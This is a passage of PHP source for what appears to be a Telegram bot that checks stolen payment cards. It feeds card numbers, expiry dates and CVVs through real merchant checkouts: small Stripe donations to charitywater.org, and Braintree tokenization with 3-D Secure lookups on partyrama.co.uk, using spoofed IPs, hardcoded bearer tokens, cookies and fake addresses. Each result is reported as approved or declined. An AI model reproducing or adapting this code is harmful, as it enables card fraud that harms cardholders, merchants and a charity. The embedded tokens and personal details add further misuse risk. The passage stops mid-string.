    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'accept-language: es-US,es;q=0.9',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$id = $data['id'];

curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.charitywater.org/donate/stripe',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'country=us&payment_intent%5Bemail%5D=poichad70%40rhyta.com&payment_intent%5Bamount%5D=1&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bpayment_method%5D='.$id.'&disable_existing_subscription_check=false&donation_form%5Bamount%5D=1&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D=poichad70%40rhyta.com&donation_form%5Bname%5D=Rigo+&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D=Perez&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_1%5D=543+w+belt+line+rd&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_2%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcity%5D=Pearland&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcountry%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Bzip%5D=37435&donation_form%5Bmetadata%5D%5Bautomatically_subscribe_to_mailing_lists%5D=true&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2Fdonate%23&donation_form%5Bmetadata%5D%5Bphone_number%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bsession_url_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false&donation_form%5Biho_attributes%5D%5Bamount_hidden%5D=false&donation_form%5Biho_attributes%5D%5Bdelivery_notification%5D=false&donation_form%5Biho_attributes%5D%5Bdesign%5D=in-memory-us&donation_form%5Biho_attributes%5D%5Bfrom_full_name%5D=&donation_form%5Biho_attributes%5D%5Bhonoree_full_name%5D=&donation_form%5Biho_attributes%5D%5Bmessage%5D=&donation_form%5Biho_attributes%5D%5Brecipient_email%5D=&donation_form%5Biho_attributes%5D%5Brecipient_full_name%5D=&donation_form%5Biho_attributes%5D%5Bsend_to%5D=honoree&donation_form%5Biho_attributes%5D%5Btype%5D=email',
  CURLOPT_COOKIE => 'countrypreference=US; optimizelyEndUserId=oeu1727042234870r0.9385499213586781; builderSessionId=a769ef11f27d4ab1b3a938966f28ac00; _gcl_au=1.1.1117950168.1727042237; _ga=GA1.1.1588880688.1727042240; FPAU=1.1.1117950168.1727042237; analytics_ids=iMG2SMEYVxANgwK3sG6DVJErN5AMZXhH8ZprCWg87gUKTXEY9Za1iAb7yUKp1QiXj8uLKdYCgwVt4x42mSLnty%2BqG454tNwaHxlW8bSGAwf7XRk6nzHkCcRMjK3%2FF0Hcx2tfvZGBVYDcG9QxI9LDBty%2BUrdNNhgH0vnmQ5VAo1Ky--HO%2FSMhnzu5mRDR3p--2E5N%2FNov5%2BSGZh126foarQ%3D%3D; __stripe_mid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f; __stripe_sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd; _ga_5H0VND0XMD=GS1.1.1727042243.1.1.1727042676.0.0.1074196026; _ga_SKG6MDYX1T=GS1.1.1727042237.1.1.1727042719.0.0.694026822',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
//    'x-csrf-token: WeaTvtRa0ZL6skk_6DkEUGqjg6wp1bPyeAr8rNuQ_5KGioeVKhhuo7n--eqtWARWnaejjhSBdntJvIZLiNngiA',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'accept-language: es-US,es;q=0.9',
    'origin: https://www.charitywater.org',
    'referer: https://www.charitywater.org/donate',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$respo = $data['error']['message'];
curl_close($curl);
	

///VERIFICA EL TINPO DE PROCESAMIENTO///
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Your card was declined.') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction not permitted by issuer') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR  ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}
	

elseif((strpos($message, "!par") === 0)||(strpos($message, "/par") === 0)||(strpos($message, ".par") === 0)){

$lista = substr($message, 5);
//$i     = explode("|", $lista);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);


////
$num = "$cc$mes$ano$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /par cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !par cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .par cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


$ip = mt_rand(0, 255) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255);
//$bear = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU4NTQyMDksImp0aSI6Ijg3NzNhMGEyLTlmZTktNDdmYy05OWE3LTNkNTdjNTI2MWM0MCIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.s5bPsNsIz0WmjwXw-ptkYCExzMzdpuQmLmxyzwyynXJ0B1_9rf4odlJ6BjUY7wuQT-bdM_NEl1HwEpS0ZhMZLw';
$bear = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYwMzA3MDksImp0aSI6Ijk1NTkzNTI5LWM0YTgtNDIzZS04MDg5LWVlNTZmZGVhOGIwMCIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.lBhDMncAdSTQga3pbtebyZZt6o3o4n8X8b3X9MNmXYPakLR-NRJ2vkrL4HOUMR4AWjjTZ1asFVt9_eKVm8EEJw';
//$bear = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYwMzEwNjUsImp0aSI6IjRmMzhiYmVlLTZlMTktNDgwZS1hZTQ0LTdkZjhkMjU4MDJiYyIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.r6T7HyGG9LAx_W8t4_6bNyUk7U5Dv6zQQsWA8zVuo06nLmSiyyVUUtq7Th2nebQrmQ7DmcL75XkBICIVYjhjZQ';
////EXTRAE EL NONCE DEL CHECK
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.partyrama.co.uk/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  //CURLOPT_COOKIE => '__kla_id=eyJlbWFpbCI6Impvam95MTc5NzBAb2Jpc2ltcy5jb20ifQ==; wp_woocommerce_session_e8067bc7d3b30e6c6ba61052d27f1737=t_a54457280b903c6696cf9a36e4d4d7%7C%7C1725847493%7C%7C1725843893%7C%7Cb82249674b520797bcee1b0787ab4f14; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-08%2003%3A55%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-08%2003%3A55%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; PHPSESSID=0c2154e0d2efb4153ffdd1480e34e042; woocommerce_cart_hash=1fa770d3bf1c17129a4be48933557e14; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fcheckout%2F',
  CURLOPT_COOKIE => 'email-section=1; email-only='.$correo.'; email-section=1; delivery-instructions=; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; PHPSESSID=219e1f52d6422e534d2371ea41241d60; woocommerce_items_in_cart=1; wp_woocommerce_session_e8067bc7d3b30e6c6ba61052d27f1737=t_9ba71db98f8a23b83246b9a81f591d%7C%7C1726117014%7C%7C1726113414%7C%7C2b17f0d48a34b8bebab8126cfa97159f; __kla_id=eyJlbWFpbCI6InJpZ29qNzc3QGdtYWlsLmNvbSJ9; woocommerce_cart_hash=4958933f2dac9049a052d2576efb347b; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'accept-language: es-US,es;q=0.6',
    'referer: https://www.partyrama.co.uk/themes/first-birthday-boy-party-supplies/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$patron = '/woocommerce-process-checkout-nonce.*?value="([^"]+)"/';
preg_match($patron, $response, $coincidencia);
$nonce1 = $coincidencia[1];
//echo "($nonce1)\n"; // Salida: c74e67aa43

//d192b23a07


///EXTRAE LAS CONF//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"822c80e1-9974-46e5-a9dd-0960c57582e4"},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'authorization: Bearer '.$bear.'',
    'braintree-version: 2018-05-10',
    'origin: https://www.partyrama.co.uk',
    'referer: https://www.partyrama.co.uk/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true); // true convierte el JSON en un a>
curl_close($curl);

$cardinalAuthenticationJWT = $data['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT'];
$googleAuthorization = $data['data']['clientConfiguration']['googlePay']['googleAuthorization'];

$paypalClientId = $data['data']['clientConfiguration']['googlePay']['paypalClientId'];
$clientId = $data['data']['clientConfiguration']['paypal']['clientId'];
$braintreeClientId = $data['data']['clientConfiguration']['paypal']['braintreeClientId'];

//echo "$paypalClientId\n";

///EXTRAE EL TOKEN
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
//  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"822c80e1-9974-46e5-a9dd-0960c57582e4"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5355842279773621","expirationMonth":"10","expirationYear":"2027","cvv":"588","billingAddress":{"postalCode":"NG17 7WS","streetAddress":"D M Tesseract"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"c60a9304-b8d6-4191-9cf4-cd2775f20ee3"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"EH6 4JL","streetAddress":"10/10 Hawthornvale"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'authorization: Bearer '.$bear.'',
    'braintree-version: 2018-05-10',
    'origin: https://assets.braintreegateway.com',
    'referer: https://assets.braintreegateway.com/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$bin = $json['data']['tokenizeCreditCard']['creditCard']['bin'];
$token = $json['data']['tokenizeCreditCard']['token'];

curl_close($curl);

//echo "Token: $token\n\n";

///EXTRAE EL NONCE
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.braintreegateway.com/merchants/h9rc962wyvrr97jn/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
//  CURLOPT_POSTFIELDS => '{"amount":"1.80","browserColorDepth":24,"browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"es-US","browserScreenHeight":851,"browserScreenWidth":393,"browserTimeZone":360,"deviceChannel":"Browser","additionalInfo":{"shippingGivenName":"","shippingSurname":"Olivia","ipAddress":"138.84.45.137","billingLine1":"D M Tesseract","billingLine2":"PO Box 10800, Kirkby-in-Ashfield","billingCity":"Nottingham","billingState":"","billingPostalCode":"NG17 7WS","billingCountryCode":"GB","billingPhoneNumber":"(416) 831-1335","billingGivenName":"","billingSurname":"Olivia","shippingLine1":"D M Tesseract","shippingLine2":"PO Box 10800, Kirkby-in-Ashfield","shippingCity":"Nottingham","shippingState":"","shippingPostalCode":"NG17 7WS","shippingCountryCode":"GB","email":"gopejob932@ndiety.com"},"bin":"535584","dfReferenceId":"0_0b7161ac-01fb-4cf2-9f98-3259a3c19589","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.106.0","cardinalDeviceDataCollectionTimeElapsed":7,"issuerDeviceDataCollectionTimeElapsed":10067,"issuerDeviceDataCollectionResult":false},"authorizationFingerprint":"'.$bear.'","braintreeLibraryVersion":"braintree/web/3.106.0","_meta":{"merchantAppId":"www.partyrama.co.uk","platform":"web","sdkVersion":"3.106.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"822c80e1-9974-46e5-a9dd-0960c57582e4"}}',
  CURLOPT_POSTFIELDS => '{"amount":"1.80","browserColorDepth":24,"browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"es-US","browserScreenHeight":851,"browserScreenWidth":393,"browserTimeZone":360,"deviceChannel":"Browser","additionalInfo":{"shippingGivenName":"","shippingSurname":"'.$name.'","ipAddress":"'.$ip.'","billingLine1":"10/10 Hawthornvale","billingLine2":"","billingCity":"Edinburgh","billingState":"","billingPostalCode":"EH6 4JL","billingCountryCode":"GB","billingPhoneNumber":"'.$phone.'","billingGivenName":"","billingSurname":"'.$name.'","shippingLine1":"10/10 Hawthornvale","shippingLine2":"","shippingCity":"Edinburgh","shippingState":"","shippingPostalCode":"EH6 4JL","shippingCountryCode":"GB","email":"'.$correo.'"},"bin":"'.$bin.'","dfReferenceId":"0_8c3eb650-aa83-4ade-853a-1a11de9ec092","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.106.0","cardinalDeviceDataCollectionTimeElapsed":588,"issuerDeviceDataCollectionTimeElapsed":10502,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bear.'","braintreeLibraryVersion":"braintree/web/3.106.0","_meta":{"merchantAppId":"www.partyrama.co.uk","platform":"web","sdkVersion":"3.106.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"c60a9304-b8d6-4191-9cf4-cd2775f20ee3"}}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'origin: https://www.partyrama.co.uk',
    'referer: https://www.partyrama.co.uk/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$nonce = $json['paymentMethod']['nonce'];
//echo "nonce: $nonce\n\n";

curl_close($curl);


///Verifica la Targeta//
$cadena = 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.partyrama.co.uk%2F&wc_order_attribution_session_start_time=2024-09-08+03%3A55%3A13&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F128.0.0.0+Mobile+Safari%2F537.36&ship_to_different_address=1&shipping_last_name='.$name.'&shipping_phone='.$phone.'&shipping_country=GB&shipping_address_1=D+M+Tesseract&shipping_address_2=PO+Box+10800%2C+Kirkby-in-Ashfield&shipping_city=Nottingham&shipping_postcode=NG17+7WS&order_comments=&billing_last_name='.$name.'&billing_phone='.$phone.'&billing_country=GB&billing_address_1=D+M+Tesseract&billing_address_2=PO+Box+10800%2C+Kirkby-in-Ashfield&billing_city=Nottingham&billing_postcode=NG17+7WS&billing_email='.$correo.'&account_password=&shipping_method%5B0%5D=partyrama_shipping%3Arate%3A14&payment_method=braintree_cc&braintree_cc_nonce_key='.$nonce.'&braintr